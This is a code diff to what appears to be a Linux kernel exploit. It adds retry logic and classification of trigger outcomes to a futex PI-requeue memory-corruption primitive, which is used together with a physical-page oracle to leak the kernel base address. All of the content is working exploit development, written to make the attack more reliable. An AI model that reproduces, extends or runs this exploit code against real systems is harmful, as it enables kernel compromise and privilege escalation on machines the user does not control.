@@ -839,6 +839,26 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#ifndef APP_P0_SLOT_SAFE_RETRY_TRIES
+#define APP_P0_SLOT_SAFE_RETRY_TRIES 1
+#endif
+
+/*
+ * Trigger outcome classification.  A HIT means the requeue connected
+ * the fake waiter onto the PI chain and the pselect write window was
+ * observed; the caller verifies the write and scans the pipes.  A
+ * CONSUMED attempt connected the chain without an observed window:
+ * the sched_setattr walk may have overwritten the bank links, so the
+ * same slot must never be re-run.  A SAFE_MISS never moved the waiter
+ * onto the chain at all, so the bank is provably untouched and the
+ * same slot may be retried with a fresh pselect window.
+ */
+enum {
+  SLIDE_TRIGGER_HIT = 0,
+  SLIDE_TRIGGER_CONSUMED = 1,
+  SLIDE_TRIGGER_SAFE_MISS = 2,
+};
+
 static int slide_child_trigger_write(void) {
   pthread_t waiter;
   pthread_t owner;
@@ -856,12 +876,17 @@ static int slide_child_trigger_write(void) {
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
+  int requeue_connected = 0;
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
     requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
+    if (requeue_ret == 1 ||
+        (requeue_ret == -1 && requeue_errno == EDEADLK)) {
+      requeue_connected = 1;
+    }
     if (requeue_ret != 0) {
       break;
     }
@@ -869,8 +894,14 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
-  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
-    return 0;
+  if (!requeue_connected) {
+    /*
+     * The requeue never moved the waiter onto the PI target, so the
+     * sched_setattr walk ran against an unlinked chain and the fake
+     * bank is provably untouched.  Report a safe miss so the caller
+     * can retry the same slot with a fresh pselect window.
+     */
+    return SLIDE_TRIGGER_SAFE_MISS;
   }
   atomic_store(&slide_deadlock_seen, 1);
   while (!atomic_load(&slide_route_done)) {
@@ -889,29 +920,37 @@ static int slide_child_trigger_write(void) {
    * (rt_mutex_adjust_prio_chain NULL deref).  sched_ok alone is not an
    * accepted trigger.
    */
-  return atomic_load(&slide_waiter_ok) != 0 &&
-         atomic_load(&slide_pselect_write_window) != 0;
-#else
-  return atomic_load(&slide_waiter_ok) != 0 &&
-         atomic_load(&slide_pselect_write_window) != 0;
 #endif
+  if (atomic_load(&slide_pselect_write_window) != 0) {
+    return SLIDE_TRIGGER_HIT;
+  }
+  return SLIDE_TRIGGER_CONSUMED;
 }
+
+static int slide_trigger_last_kind = SLIDE_TRIGGER_CONSUMED;
 
 static int slide_trigger_physical_state(void) {
   pid_t child = SYSCHK(fork());
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
     if (getppid() == 1) {
-      _exit(1);
+      _exit(SLIDE_TRIGGER_CONSUMED);
     }
     disable_rseq_for_thread();
     slide_log_child_context();
-    _exit(slide_child_trigger_write() ? 0 : 1);
+    _exit(slide_child_trigger_write());
   }
   int status = 0;
   SYSCHK(waitpid(child, &status, 0));
-  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
-  pr_info("p0 physical write status=%d ok=%d\n", status, ok);
+  int kind = WIFEXITED(status) ? WEXITSTATUS(status)
+                               : SLIDE_TRIGGER_CONSUMED;
+  if (kind != SLIDE_TRIGGER_HIT && kind != SLIDE_TRIGGER_CONSUMED &&
+      kind != SLIDE_TRIGGER_SAFE_MISS) {
+    kind = SLIDE_TRIGGER_CONSUMED;
+  }
+  slide_trigger_last_kind = kind;
+  int ok = kind == SLIDE_TRIGGER_HIT;
+  pr_info("p0 physical write status=%d ok=%d kind=%d\n", status, ok, kind);
   return ok;
 }
 
@@ -963,11 +1002,32 @@ static int slide_trigger_physical_slot(size_t slot) {
   return 0;
 }
 
+/*
+ * Retry a physical slot only while the previous attempt is a provably
+ * clean miss: the requeue never connected the fake waiter onto the PI
+ * chain, so the bank is untouched and a fresh pselect window can be
+ * attempted on the same slot.  A connected attempt (hit or consumed)
+ * must never be re-run: the walk already overwrote the bank links.
+ */
+static int slide_trigger_physical_slot_retry(size_t slot) {
+  for (int retry = 1; retry <= APP_P0_SLOT_SAFE_RETRY_TRIES; retry++) {
+    if (slide_trigger_physical_slot(slot)) {
+      return 1;
+    }
+    if (slide_trigger_last_kind != SLIDE_TRIGGER_SAFE_MISS) {
+      break;
+    }
+    pr_warning("p0 physical slot=%zu safe retry try=%d/%d\n",
+               slot, retry, APP_P0_SLOT_SAFE_RETRY_TRIES);
+  }
+  return 0;
+}
+
 static int slide_restore_physical_oracle(void) {
   int gate_restored =
-      slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
+      slide_trigger_physical_slot_retry(P0_ORACLE_GATE_RESTORE_SLOT);
   int probe_restored =
-      slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
+      slide_trigger_physical_slot_retry(P0_ORACLE_PROBE_RESTORE_SLOT);
   pr_info("p0 physical restore triggers gate=%d probe=%d "
           "gate_page=%016zx probe_page=%016zx\n",
           gate_restored, probe_restored,
@@ -1117,7 +1177,7 @@ static int slide_leak_physical_base(void) {
 #endif
       continue;
     }
-    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+    if (!slide_trigger_physical_slot_retry(P0_ORACLE_GATE_SLOT)) {
       pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
                fresh_attempt, fresh_page_attempts);
       fresh_attempt++;
@@ -1160,7 +1220,7 @@ static int slide_leak_physical_base(void) {
       slide_restore_physical_oracle();
       return 0;
     }
-    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    if (!slide_trigger_physical_slot_retry(P0_ORACLE_PROBE_SLOT)) {
       pr_warning("p0 probe slot trigger failed fresh=%d/%d\n",
                  fresh_attempt, fresh_page_attempts);
       /*
